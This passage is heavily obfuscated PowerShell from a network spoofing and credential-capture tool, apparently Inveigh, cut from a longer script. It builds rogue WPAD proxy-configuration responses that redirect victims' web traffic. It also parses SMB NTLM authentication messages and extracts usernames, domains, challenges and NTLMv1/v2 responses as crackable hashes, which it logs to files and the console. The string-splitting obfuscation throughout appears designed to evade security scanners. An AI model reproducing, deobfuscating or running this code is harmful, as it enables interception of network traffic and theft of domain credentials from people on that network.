        if(${prOXY_`PORT`_`cHE`CK})
        {
            ${p`R`Oxy} = "N"
            ${InV`eI`Gh}."s`T`A`TUS_qUeue".("{0}{1}" -f'Ad','d').Invoke(('Pr'+'oxy '+'Ca'+'pture'+' '+'Dis'+'abl'+'ed '+'Due'+' '+'To'+' '+'I'+'n '+'Us'+'e '+'Port'+' '+"$ProxyPort"))  > ${N`ULL}
        }
        else
        {
            ${InVe`I`gh}."ST`A`TuS`_QUEuE".("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{5}{2}{3}{4}"-f 'Proxy ','C','pture = E','na','bled','a'))  > ${N`UlL}
            ${iN`VeiGH}."stATus`_`qUe`Ue".("{0}{1}" -f'Ad','d').Invoke(('Prox'+'y '+'Port'+' '+'= '+"$ProxyPort")) > ${n`ULl}
            ${InVeI`gh}."sT`AtUs_Qu`EuE".("{0}{1}" -f'Ad','d').Invoke(('P'+'roxy '+'Au'+'then'+'tication'+' '+'= '+"$ProxyAuth"))  > ${Nu`Ll}
            ${P`ROXyP`ORTfAi`L`OVER} = ${prOX`yp`OrT} + 1
            ${prOXY`iGN`Ore} = (${PR`O`Xy`IgnOre} | &("{3}{1}{2}{0}" -f'ect','here-','Obj','W') {${_} -and ${_}.("{0}{1}" -f'Tri','m').Invoke()})

            if(${PrOx`yIGNO`RE}."C`OUnT" -gt 0)
            {
                ${i`NVEIgH}."ST`A`TUS`_QUeUe".("{0}{1}"-f 'Ad','d').Invoke(("{4}{3}{2}{1}{0}" -f '= ','st ','i','oxy Ignore L','Pr') + (${pr`OX`y`igNOre} -join ","))  > ${n`UlL}
            }

            if(${p`ROXYiP} -eq ("{1}{0}" -f'.0.0','0.0'))
            {
                ${P`RoXy_w`p`Ad_Ip} = ${ip}
            }
            else
            {
                ${PrOXY_WpA`d_`ip} = ${pr`O`xYIp}
            }

            if(${Wp`A`DiP} -and ${wpAdpO`RT})
            {
                ${W`pAdrE`sP`OnSE} = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $WPADIP`:$WPADPort; DIRECT`";}"
            }
            else
            {
                ${w`pad`ReSPONsE} = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_wpad_IP`:$ProxyPortFailover; DIRECT`";}"
            }

        }

    }

    if(${W`padDi`ReCT`H`OsTs})
    {
        ForEach(${wPaD`_`d`i`REc`T_HoST} in ${w`pADdIreCtH`o`s`TS})
        {
            ${Wpa`d`_`Dir`eCt_HosTs`_fun`ctioN} += (((("{0}{1}{3}{2}{4}{5}"-f'i','f (dnsDom','Is','ain','(hos','t, {0}'))  -f[char]34)) + ${WPa`d_DIreC`T_`h`O`ST} + (((("{1}{3}{2}{4}{0}{5}" -f'{0}DIRE','{0',' retu','}))','rn ','CT{0};'))-F [CHaR]34))
        }

        ${iNV`EI`Gh}."statUS_q`U`EUE".("{1}{0}"-f 'dd','A').Invoke(("{1}{0}{2}{3}" -f 'ct','WPAD Dire',' Hos','ts = ') + (${w`P`Add`Ir`ecThoStS} -join ","))  > ${N`UlL}
    }

    if(${wP`ADREs`Po`N`SE} -and ${p`RoxY} -eq 'N')
    {
        ${i`NVe`IGH}."sT`ATu`S_que`Ue".("{1}{0}"-f 'dd','A').Invoke(("{3}{5}{0}{7}{2}{4}{1}{6}" -f 'u','onse = ','Res','WPAD','p',' C','Enabled','stom '))  > ${n`ULL}
    }
    elseif(${w`PadR`e`SpOn`sE} -and ${PRo`XY} -eq 'Y')
    {
        ${InV`ei`gH}."S`Tatu`s_`queuE".("{1}{0}" -f 'd','Ad').Invoke(("{1}{4}{6}{5}{2}{0}{3}" -f 'e','WP','l','d','AD Pro',' Enab','xy Response ='))  > ${N`Ull}

        if(${WpA`D`iP} -and ${WP`AD`Port})
        {
            ${iNV`eI`gh}."S`TA`TUS`_QuEUe".("{1}{0}" -f'dd','A').Invoke(('WPA'+'D '+'F'+'ailove'+'r '+'= '+"$WPADIP`:$WPADPort"))  > ${N`ULL}
        }

    }
    elseif(${wpA`dip} -and ${Wpa`Dp`ort})
    {
        ${i`N`VeIgh}."Stat`Us_QUe`Ue".("{0}{1}" -f 'A','dd').Invoke(("{0}{3}{4}{2}{1}"-f 'WPAD Respon','d','Enable','se',' = '))  > ${NU`LL}
        ${i`NvEi`gH}."s`TatUs`_QUEue".("{0}{1}"-f'Ad','d').Invoke(('WPAD'+' '+'= '+"$WPADIP`:$WPADPort"))  > ${nu`ll}
        
        if(${Wp`ADdi`ReCtHO`S`TS})
        {
            ForEach(${WP`Ad_`D`IRECt_hOsT} in ${wPa`Dd`IreCt`hos`TS})
            {
                ${Wp`A`d_`DirEct`_HoS`Ts_fuNcT`I`ON} += (((("{5}{2}{4}{3}{0}{6}{1}"-f'Is',' 6fY','n','main','sDo','if (d','(host,'))-repLAcE'6fY',[cHar]34)) + ${wPa`D_`D`IreCT_hOsT} + (((("{1}{5}{4}{8}{6}{3}{0}{7}{2}"-f 'IRE','{0','{0};','D',' {','})) return','}','CT','0'))-F [chaR]34))
            }

            ${W`pAD`ResPon`sE} = "function FindProxyForURL(url,host){" + ${W`pAd_dirEC`T_Ho`s`Ts`_`FUNctI`On} + ('return'+' '+"`"PROXY "+'') + ${WPa`D`Ip} + ":" + ${WP`A`Dport} + "`";}"
            ${IN`Veigh}."ST`At`U`s_queue".("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{3}{0}" -f 'irect Hosts = ','A','WP','D D') + (${WpadDi`REC`Th`OsTS} -join ","))  > ${nu`ll}
        }
        else
        {
            ${wPAdRE`SpO`N`sE} = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $WPADIP`:$WPADPort; DIRECT`";}"
        }

    }
    elseif(${W`padd`irEcTf`i`le} -eq 'Y')
    {
        ${inv`EiGh}."stAtu`S_que`Ue".("{0}{1}"-f 'Ad','d').Invoke(("{8}{5}{3}{4}{1}{7}{9}{0}{2}{6}" -f ' E','n','nabl','ult',' Respo','D Defa','ed','se ','WPA','='))  > ${n`Ull}
        ${wpAdreSpO`N`SE} = "function FindProxyForURL(url,host){return `"DIRECT`";}"
    }

    if(${c`HaLlE`NGE})
    {
        ${IN`VEiGh}."Sta`TUs_q`Ue`Ue".("{1}{0}" -f'd','Ad').Invoke(('NT'+'LM '+'Cha'+'l'+'lenge'+' '+'= '+"$Challenge"))  > ${n`Ull}
    }

}

if(${MA`c`h`i`NeACCoUnTs} -eq 'N')
{
    ${INV`E`iGH}."S`TATus_Q`U`eUe".("{1}{0}"-f'dd','A').Invoke(("{2}{1}{0}{4}{6}{3}{5}"-f ' ','chine','Ma',' Disa','Accoun','bled','t Capture ='))  > ${n`UlL}
    ${i`Nv`Eigh}."m`A`CHI`NE`_aCCoUn`Ts" = ${faL`Se}
}
else
{
    ${i`NvE`iGh}."Mach`iNe`_aCC`oUNts" = ${T`RuE}
}

if(${cOn`S`oLeOU`TPut} -ne 'N')
{

    if(${CO`Ns`oleou`TPuT} -eq 'Y')
    {
        ${iN`V`eIgH}."staT`US_q`Ue`Ue".("{0}{1}" -f 'A','dd').Invoke(("{1}{9}{3}{7}{10}{5}{4}{2}{0}{8}{6}" -f'=','Real Tim','t ','n','Outpu','le ','led','s',' Enab','e Co','o'))  > ${NU`ll}
    }
    else
    {
        ${I`NvE`IGH}."stATUs`_q`U`EuE".("{0}{1}" -f 'Ad','d').Invoke(('Real'+' '+'Ti'+'me '+'Console'+' '+'Ou'+'t'+'put '+'= '+"$ConsoleOutput"))  > ${Nu`lL}
    }

    ${inV`E`igh}."Co`NSoLe_oUT`put" = ${T`RUE}

    if(${c`ONs`oLest`At`Us} -eq 1)
    {
        ${I`N`VeIgH}."Stat`U`S_q`UeuE".("{1}{0}" -f 'd','Ad').Invoke(('Co'+'nsole '+'Sta'+'tus'+' '+'= '+"$ConsoleStatus "+'M'+'inute'))  > ${N`Ull}
    }
    elseif(${co`N`soL`EstaTUS} -gt 1)
    {
        ${In`V`EIGh}."StAtu`S`_queue".("{1}{0}" -f 'd','Ad').Invoke(('Console'+' '+'Statu'+'s '+'= '+"$ConsoleStatus "+'Min'+'u'+'tes'))  > ${nu`lL}
    }

}
else
{

    if(${inVe`I`GH}."t`Ool" -eq 1)
    {
        ${I`NvEI`GH}."St`AtuS_q`Ueue".("{0}{1}"-f 'Ad','d').Invoke(("{11}{5}{7}{4}{1}{12}{2}{6}{10}{9}{8}{0}{13}{3}" -f 'l Sele','put ','d Du','tion','t','nsole','e ',' Ou','o','ternal To','To Ex','Real Time Co','Disable','c'))  > ${n`ULL}
    }
    else
    {
        ${InvEI`gh}."st`AtUs`_`queue".("{1}{0}" -f 'd','Ad').Invoke(("{0}{3}{5}{2}{4}{1}" -f 'Real Tim','d',' Output = ','e Cons','Disable','ole'))  > ${NU`lL}
    }

}

if(${cOn`sol`EUNi`Q`Ue} -eq 'Y')
{
    ${inV`e`IgH}."C`o`NS`oLe_un`IQUe" = ${tR`Ue}
}
else
{
    ${inv`e`iGh}."Con`SoLe_`Un`iq`Ue" = ${f`A`lsE}
}

if(${fI`LE`OUtpuT} -eq 'Y')
{
    ${IN`V`EiGh}."StaTUS_`q`U`eUE".("{1}{0}"-f 'dd','A').Invoke(("{4}{6}{2}{0}{5}{3}{1}{7}" -f 'pu','Enab','ime File Out',' ','Real ','t =','T','led'))  > ${NU`ll}
    ${iNV`ei`gH}."sTATU`s_Que`Ue".("{1}{0}" -f'dd','A').Invoke(('Outp'+'ut '+'Di'+'re'+'ctory '+'= '+"$output_directory"))  > ${Nu`LL}
    ${in`V`eIgh}."fIlE`_`OUTpUT" = ${t`RUe}
}
else
{
    ${IN`V`eIGH}."ST`AtUS`_quE`UE".("{0}{1}" -f'Ad','d').Invoke(("{5}{3}{7}{0}{4}{1}{2}{6}"-f 'O','pu','t = Dis','im','ut','Real T','abled','e File '))  > ${NU`Ll}
}

if(${Fi`L`eunIqUe} -eq 'Y')
{
    ${In`V`eIGH}."f`IlE_`UNIQue" = ${tr`UE}
}
else
{
    ${In`VeIgH}."FilE_`U`Ni`qUe" = ${f`AL`se}
}

if(${rU`NCounT})
{
    ${inve`I`Gh}."S`TAt`US_QU`EUe".("{1}{0}" -f 'd','Ad').Invoke(('R'+'un '+'Count'+' '+'= '+"$RunCount")) > ${n`ULL}
}

if(${r`UN`TimE} -eq 1)
{
    ${IN`Ve`iGh}."S`TaTu`s_QUE`UE".("{0}{1}" -f 'A','dd').Invoke(('Run'+' '+'Time'+' '+'= '+"$RunTime "+'Mi'+'nute'))  > ${n`UlL}
}
elseif(${RUN`T`ime} -gt 1)
{
    ${INV`E`igh}."S`TA`Tu`S_quEue".("{0}{1}"-f 'A','dd').Invoke(('R'+'un '+'Tim'+'e '+'= '+"$RunTime "+'Minu'+'t'+'es'))  > ${NU`LL}
}

if(${Sh`Ow`HElP} -eq 'Y')
{
    ${in`V`EIGh}."sta`T`Us_qu`EUE".("{1}{0}"-f 'd','Ad').Invoke(("{0}{5}{4}{8}{3}{1}{2}{7}{6}"-f 'Run St','stop I','nve',' to ','p-Inveig','o','gh','i','h'))  > ${Nu`ll}
        
    if(${inV`E`IGh}."cONs`o`lE`_o`UTPUT")
    {
        ${in`VeiGh}."ST`AtUS_QUe`Ue".("{1}{0}" -f 'dd','A').Invoke(("{10}{8}{5}{2}{0}{11}{4}{3}{1}{7}{6}{9}" -f 'op rea','c',' to st','me ','i','ess any key','ole outp','ons','r','ut','P','l t'))  > ${nU`lL}
    }

}

if(${inve`IgH}."St`AT`US_ouT`pUt")
{

    while(${i`Nv`EIGh}."sTaT`U`s_QuEUE"."COU`Nt" -gt 0)
    {

        switch -Wildcard (${INv`eiGH}."sta`T`Us`_QueuE"[0])
        {

            {${_} -like ("{4}{1}{5}{3}{2}{0}"-f' *','sabled Due','o','T','* Di',' ') -or ${_} -like ("{3}{4}{5}{2}{1}{0}" -f ' Inveigh','p','gh to sto','Run ','Sto','p-Invei') -or ${_} -like ("{5}{0}{4}{3}{2}{1}"-f'a','ed','l','Enab','ll = ','Windows Firew')}
            {

                if(${INVE`IGh}."out`PuT_`stREa`M`_ONly")
                {
                    &("{0}{3}{2}{1}"-f 'Write','ut','tp','-Ou')(${in`VEIGh}."s`TAtUs_Q`UEUe"[0] + ${I`Nve`Igh}."N`eW`lInE")
                }
                else
                {
                    &("{1}{4}{2}{3}{0}" -f 'arning','Wri','e','-W','t')(${I`N`VEIgH}."STAt`US_q`Ue`UE"[0])
                }

                ${iNv`e`igh}."STAtu`S`_quEUe".("{0}{1}{2}"-f 'Re','m','oveAt').Invoke(0)
            }

            ("{2}{1}{0}" -f 'fault','e','d')
            {

                if(${iNvei`gH}."OutP`UT_`STreaM_on`ly")
                {
                    &("{1}{3}{0}{2}" -f'Ou','Write','tput','-')(${I`Nv`eIgh}."StAtus_Q`Ue`UE"[0] + ${In`V`eiGh}."nEwL`ine")
                }
                else
                {
                    &("{0}{2}{1}" -f'Write-','put','Out')(${iNv`eigh}."sTaTuS`_q`Ueue"[0])
                }

                ${invE`igh}."StaTu`s_qU`EUe".("{1}{0}"-f'eAt','Remov').Invoke(0)
            }

        }

    }

}




${S`harE`D_BAsIC_f`U`N`cti`onS_sCRiPTbLOCk} =
{

    function DATAToUi`NT`16(${f`i`ELd})
    {
	    $3xP::("{1}{0}" -f 'verse','Re').Invoke(${f`IElD})
	   return  ( &("{1}{0}"-f'ci','G')  ("VARia"+"blE:"+"c"+"Y"+"j6e1") ).Value::("{2}{0}{1}"-f 'n','t16','ToUI').Invoke(${f`iEld},0)
    }

    function dA`TA`ToUiNT32(${fI`eLd})
    {
	    (&('gi')  VarIAbLe:3xP ).vaLUe::("{0}{1}" -f'R','everse').Invoke(${f`IeLD})
	   return   (&("{1}{0}" -f 'R','dI')  VaRIABlE:cyj6E1  ).vALuE::("{2}{1}{0}"-f't32','UIn','To').Invoke(${Fi`E`LD},0)
    }

    function D`ATAleN`G`Th2
    {
        param ([Int]${L`E`NG`Th`_sTaRt},[Byte[]]${s`TR`iNg_eXTRA`ct`_da`Ta})

        ${strin`G_`l`engTH} =   $cyj6e1::"TO`U`iNt16"(${sTR`INg_`EXtracT_`DAta}[${LeNG`T`h`_sTART}..(${L`eNgt`h_sTa`RT} + 1)],0)
        return ${StRing_`L`e`Ngth}
    }

    function Data`L`EngTh4
    {
        param ([Int]${LeNgTH`_`stArT},[Byte[]]${s`TRINg`_E`XtRACt_D`ATA})

        ${sT`Ri`N`G_lEnG`TH} =  $cYJ6E1::"t`oUi`Nt32"(${ST`Ri`Ng`_ex`TraCT_dA`TA}[${l`ENGtH_`st`ART}..(${leng`T`H_StA`Rt} + 3)],0)
        return ${S`TRi`N`g_l`ENGTh}
    }

    function dAtat`o`STRing
    {
        param ([Int]${STR`I`NG`_staRt},[Int]${S`TriNG_`lEn`G`Th},[Byte[]]${ST`RIn`G`_extrACt_DatA})

        ${St`Ring`_DATa} =   ( &("{3}{0}{2}{1}"-f'h','Em','iLdIt','c') VariAbLe:cYj6E1 ).vAlUe::"TO`str`INg"(${St`RinG_`eX`TRAC`T`_`Data}[${stRinG`_`StaRT}..(${str`IN`G`_`stArt} + ${STri`NG`_lENGTH} - 1)])
        ${stR`iNG`_dAta} = ${S`T`Ring`_DAtA} -replace "-00",""
        ${st`RI`NG_D`AtA} = ${stR`Ing_DA`TA}.("{1}{0}" -f 'lit','Sp').Invoke("-") | &("{3}{2}{1}{0}" -f'ject','Each-Ob','or','F'){[Char] ( &("{0}{2}{1}"-f'VA','LE','Riab')  ('IGU7Q'+'m') -vAluEOn  )::("{2}{0}{1}" -f 'oI','nt16','T').Invoke(${_},16)}
        ${S`T`RIng_eXtR`ACt} = &("{0}{2}{1}" -f 'New-O','ject','b') ("{3}{2}{0}{4}{1}" -f'r','ng','tem.St','Sys','i') (${St`RI`N`g_DATa},0,${S`TrING`_D`ATa}."LEN`g`TH")
        return ${sT`RiN`G_e`X`Tract}
    }

    function cOnVE`RTfro`M`-PACKEtoRDe`RedDi`CT`Io`N`Ary
    {
        param(${Pa`cK`et_O`RDE`R`ed_dI`c`TionaRY})

        ForEach(${Fi`E`Ld} in ${pA`cke`T_orDered`_`D`ic`T`iOnARY}."v`AluEs")
        {
            ${bY`T`E_Ar`RAy} += ${F`ie`lD}
        }

        return ${B`YTE_ar`RAy}
    }

}


${sM`B_NtL`M`_fuNcTIONS_sC`RIPtbL`oCK} =
{

    function smB`NT`lmcHALLE`NgE
    {
        param ([Byte[]]${PA`YL`oAd_B`y`TeS})

        ${paY`loAd} =  $cYj6E1::("{1}{0}{2}"-f'oS','T','tring').Invoke(${pa`Yl`oAd_BYT`Es})
        ${P`AY`lOaD} = ${P`AY`lOAD} -replace "-",""
        ${n`Tlm_IN`d`eX} = ${pAYl`oad}.("{0}{1}{2}" -f 'Inde','x','Of').Invoke(("{4}{0}{2}{3}{1}"-f'E544','00','C4D5','35350','4'))

        if(${ntLM`_IN`Dex} -gt 0 -and ${PA`yL`oad}.("{0}{2}{1}" -f 'SubS','ring','t').Invoke((${N`TLM`_iN`Dex} + 16),8) -eq ("{0}{1}" -f'0','2000000'))
        {
            ${n`T`Lm_C`H`ALLEngE} = ${Pa`YL`Oad}.("{0}{2}{1}"-f'Su','String','b').Invoke((${nTLM`_i`NdeX} + 48),16)
        }

        return ${ntl`m_`CHaLlEN`GE}
    }

    function sMBNTlm`ResPo`NSE
    {
        param ([Byte[]]${pA`YLo`AD_ByT`ES})

        ${Pa`Y`loaD} =  (  &("{1}{2}{0}"-f'E','VAriab','L')  cYj6E1 -ValuEOnl  )::("{0}{1}"-f 'To','String').Invoke(${pA`y`Load`_bYTES})
        ${P`AYlo`Ad} = ${p`Ay`lOaD} -replace "-",""
        ${N`TlmSSp_`heX`_O`F`FsEt} = ${pAY`lOad}.("{1}{0}{2}" -f 'dexO','In','f').Invoke(("{3}{1}{4}{0}{2}" -f'53','544C4D5','5000','4E','3'))

        if(${NTL`msSp_hex`_of`FSeT} -gt 0 -and ${PA`Yl`OAD}.("{0}{1}{2}"-f 'Su','b','String').Invoke((${NTlmSs`p_`Hex_OfF`s`et} + 16),8) -eq ("{0}{1}{2}" -f'030000','0','0'))
        {
            ${N`TlMSSP_`OFF`SEt} = ${Nt`L`mS`Sp_hex_O`FFSet} / 2

            ${L`M_le`N`gTh} = &("{0}{2}{1}" -f'Dat','ength2','aL') (${N`TLMs`sP_OFfs`Et} + 12) ${P`AylO`Ad_`ByteS}
            ${LM_Off`s`ET} = &("{3}{1}{2}{0}"-f'h4','aLe','ngt','Dat') (${N`TLM`sSp`_offset} + 16) ${pAy`lO`A`d_bYtes}
            ${L`m_R`EsPOn`SE} =   (  &("{1}{0}"-f'TEM','I')  ('vaR'+'IA'+'b'+'le:cYj'+'6E1') ).vAlue::"tO`ST`RiNG"(${PAy`lOaD_b`y`Tes}[(${ntl`m`Ssp`_oFFS`eT} + ${l`m_`OFFsET})..(${nTL`Ms`sp_`oFfsET} + ${Lm_o`F`FseT} + ${L`m_L`engTH} - 1)]) -replace "-",""

            ${ntLm_`l`eng`Th} = &("{0}{1}{2}" -f 'DataL','ength','2') (${nTLmSSp`_Offs`ET} + 20) ${Pay`loa`D_b`yT`es}
            ${NT`lM`_o`FfsEt} = &("{2}{1}{0}" -f 'th4','eng','DataL') (${NTLMsSp_O`F`F`SET} + 24) ${P`A`Y`l`oAd_bytes}
            ${N`Tlm_R`ESPO`N`se} =  ( &("{2}{0}{3}{1}" -f 'ChI','iteM','geT-','Ld')  VaRiABLe:Cyj6e1).VALue::"To`S`TRINg"(${paY`lOAD`_`BY`Tes}[(${n`T`lm`s`SP_oFFSet} + ${nTl`m_OF`FSet})..(${n`TLmsSp`_OfFs`et} + ${n`TLM`_OfFSET} + ${NtL`m_Le`N`Gth} - 1)]) -replace "-",""

            ${D`OmaIN_LEN`G`Th} = &("{3}{0}{1}{2}" -f 'ata','Length','2','D') (${N`TLMsS`P_OFFSET} + 28) ${p`AyL`OA`d_byTeS}
            ${DOM`Ai`N_o`F`FSEt} = &("{1}{2}{3}{0}"-f 'th4','Dat','aL','eng') (${nTlM`S`sp_`o`FFseT} + 32) ${p`AYLO`Ad`_Byt`Es}
            ${NtLM_Do`mAI`N_s`Tr`iNg} = &("{2}{1}{0}"-f'ing','ToStr','Data') (${NTL`Ms`sp`_O`FFsET} + ${D`O`MaIn`_OF`FSeT}) ${doMa`IN_`L`ENgTh} ${PaylOaD_`B`Y`T`ES}

            ${u`S`eR_leNGtH} = &("{1}{2}{0}"-f'Length2','Da','ta') (${ntLms`sp_o`F`FsET} + 36) ${pAYLO`Ad_b`yT`Es}
            ${User`_oFf`Set} = &("{2}{0}{1}" -f'aLe','ngth4','Dat') (${Nt`l`mSSP_Off`SEt} + 40) ${pa`yL`OA`D`_bytEs}
            ${Nt`lm_useR_S`Tr`ING} = &("{3}{0}{1}{2}"-f'aToSt','ri','ng','Dat') (${N`Tl`MSSp_OfFsEt} + ${UseR_O`FFS`Et}) ${Use`R_`LEn`gth} ${pAYloA`d_b`YT`es}

            ${hOsT_L`e`N`gTH} = &("{1}{2}{3}{0}" -f 'h2','D','ataLeng','t') (${N`Tlm`SS`p_OfFSeT} + 44) ${pA`Y`LOaD_BYt`ES}
            ${h`Os`T_OF`FSEt} = &("{1}{2}{0}"-f'th4','Dat','aLeng') (${N`TlMSSP`_ofFs`eT} + 48) ${payLOad`_B`YteS}
            ${N`TlM_hOSt`_S`TrinG} = &("{0}{3}{2}{1}" -f 'Data','ring','oSt','T') (${NtLMSS`p_O`Ffs`Et} + ${H`os`T_offseT}) ${HOsT`_LenG`Th} ${pA`YloaD`_`BY`TEs}

            if(${NtLm`_`LEn`Gth} -gt 24)
            {
                ${N`TL`m`V2_rES`Po`NSe} = ${NT`l`m`_`RespONSe}.("{1}{0}"-f'ert','Ins').Invoke(32,':')
                ${ntl`M`V`2_haSH} = ${NT`lM_uS`Er_sT`RI`Ng} + "::" + ${Ntlm_Do`M`AiN`_S`TRInG} + ":" + ${NT`lM_Cha`Lle`N`ge} + ":" + ${N`T`lmV2_reSp`O`Nse}

                if(${S`oURce_`ip} -ne ${Ip} -and (${i`NvEI`gh}."MAcH`I`NE_aC`Cou`NTS" -or (!${in`VEi`gH}."machinE_`A`ccOunts" -and -not ${NTlm`_U`SEr`_stRiNG}.("{0}{2}{1}"-f'EndsW','h','it').Invoke('$'))))
                {

                    if(${inV`eIGH}."File`_OuT`pUT")
                    {
                        ${IN`VEI`Gh}."LOg_`FIlE_Q`UeUe".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string) "))
                    }

                    if(${INV`EIgh}."loG`_`OUTPut")
                    {
                        ${IN`VE`IgH}."l`Og".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string) "))
                    }

                    ${INV`EI`Gh}."NtlM`V2_li`St".("{1}{0}"-f 'd','Ad').Invoke(${Nt`l`mv2_hASH})

                    if(!${IN`V`eiGh}."cOn`so`lE`_`UniQUE" -or (${iNV`E`IGH}."CONs`oLe`_u`NiQuE" -and ${iNv`EI`Gh}."N`TLmV2_u`sernAM`E_`Li`st" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string")))
                    {
                        ${InVeI`gh}."c`oN`Sole_`QU`Eue".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash "))
                    }
                    else
                    {
                        ${i`N`VEiGh}."ConS`OL`e_QueUe".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string - not unique "))
                    }

                    if(${InV`eiGH}."FIL`e_Out`puT" -and (!${in`VEI`gH}."fIl`e`_Un`iQUe" -or (${iN`V`eIGh}."Fi`le_u`NiQuE" -and ${I`N`VEigh}."nTlm`V2_USer`Na`M`E_lIST" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))))
                    {
                        ${INV`E`Igh}."N`TLm`V`2_FILE_QUeue".("{1}{0}"-f'd','Ad').Invoke(${nt`lm`V2`_HasH})
                        ${I`N`VEIgh}."CoN`s`oL`e_queue".("{1}{0}" -f 'dd','A').Invoke(("{7}{3}{0}{8}{11}{4}{2}{9}{6}{5}{1}{10}"-f 'B NTLM','wr','s','M','re','e ','s','S','v','pon','itten to ','2 challenge/') + ${INveI`gh}."ntLmV2`_o`UT_F`i`Le")
                    }

                    if(${iNvE`i`gh}."NT`lm`V2_U`se`RNAme_li`St" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))
                    {
                        ${IN`V`EiGh}."nT`lMV`2`_Usern`AM`E`_lISt".("{0}{1}"-f 'Ad','d').Invoke(("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))
                    }

                    if(${InV`eIgh}."IP_cA`PtuRE`_`lIST" -notcontains ${s`Ou`R`ce_ip} -and -not ${nTLm_uS`e`R_`s`TrINg}.("{1}{0}{2}" -f't','EndsWi','h').Invoke('$') -and !${I`Nvei`gh}."SP`OOf`Er_R`ep`EAT" -and ${sOU`RcE_`ip} -ne ${Ip})
                    {
                        ${In`VE`IgH}."ip_ca`ptuRe`_`L`IsT".("{0}{1}" -f 'Ad','d').Invoke(${Sour`CE`_ip}."IpadD`ReSStosT`RI`Ng")
                    }

                }

            }
            elseif(${n`T`LM_leng`Th} -eq 24)
            {
                ${NtL`mv1`_hA`sh} = ${nT`Lm_`USe`R_s`TRiNg} + "::" + ${Nt`l`M_`DOm`Ain_`STrINg} + ":" + ${l`m_rEsPO`N`sE} + ":" + ${NTlM`_`RE`sPo`NSe} + ":" + ${NtL`M_ChalL`eNgE}

                if(${S`oUr`ce_IP} -ne ${I`p} -and (${in`Ve`iGH}."M`Ac`HINE_a`cco`UnTS" -or (!${inve`I`gh}."M`ACHIn`E_a`CcoUNTs" -and -not ${ntL`m_`UsEr`_`stRIng}.("{2}{0}{1}"-f'ndsWit','h','E').Invoke('$'))))
                {

                    if(${INv`eigh}."fi`Le_oUT`put")
                    {
                        ${I`NV`EIGh}."log_`FILE_`QuEuE".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string) "))
                    }

                    if(${I`N`VeigH}."LOg_`ouT`Put")
                    {
                        ${INV`eI`gh}."l`Og".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string) "))
                    }

                    ${iN`VE`IGH}."NTL`m`V1_List".("{1}{0}" -f'd','Ad').Invoke(${nT`LmV1_H`AsH})

                    if(!${IN`VEiGH}."COns`OLE_unI`Q`UE" -or (${i`N`VEiGh}."c`on`so`Le_unI`Que" -and ${inV`E`Igh}."nTlMV1_u`seR`NA`mE_Li`St" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string")))
                    {
                        ${INV`E`igh}."CO`NsoLE_`Q`U`EUE".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash "))
                    }
                    else
                    {
                        ${in`VeIGH}."C`On`Sole_Q`UeUE".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string - not unique "))
                    }

                    if(${i`N`VEIGH}."FI`le_`o`UtPut" -and (!${i`NV`EigH}."fI`LE_U`NiQuE" -or (${IN`Vei`Gh}."FIL`E_UnI`QUE" -and ${Invei`gH}."Nt`Lmv1_usErnAM`E_lI`st" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))))
                    {
                        ${i`N`VEIgH}."Nt`L`mv1_fil`E_QUE`Ue".("{1}{0}"-f'dd','A').Invoke(${n`TLmv1`_HA`Sh})
                        ${I`NV`eiGH}."c`o`NSoLE_QuE`Ue".("{0}{1}"-f 'Ad','d').Invoke(("{2}{8}{6}{7}{4}{9}{5}{1}{3}{0}"-f' ','n ','SMB NTLMv1','to','/r',' writte','halle','nge',' c','esponse') + ${i`NV`eIgH}."NTLMV`1_o`U`T`_filE")
                    }

                    if(${INV`E`IgH}."nt`Lmv1`_uS`ername`_l`i`st" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))
                    {
                        ${IN`VeiGH}."nTLMv1_`Us`E`R`NaME`_LiST".("{1}{0}"-f 'd','Ad').Invoke(("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))
                    }

                    if(${iNV`ei`Gh}."Ip`_c`A`ptUre_lIsT" -notcontains ${s`ouR`ce_ip} -and -not ${NtLm_Use`R`_s`TR`I`NG}.("{1}{2}{0}" -f 'sWith','E','nd').Invoke('$') -and !${I`NVEI`GH}."s`P`OoFeR_r`epEat" -and ${sOur`cE_`IP} -ne ${IP})
                    {
                        ${iNVe`IgH}."i`P`_CaPTUr`e`_List".("{0}{1}" -f 'A','dd').Invoke(${SOUR`ce`_iP}."ipA`dDREs`S`TOStr`INg")
                    }

                }

            }

        }

    }

}


${ht`TP_`S`cRIPtblOCk} = 
{ 
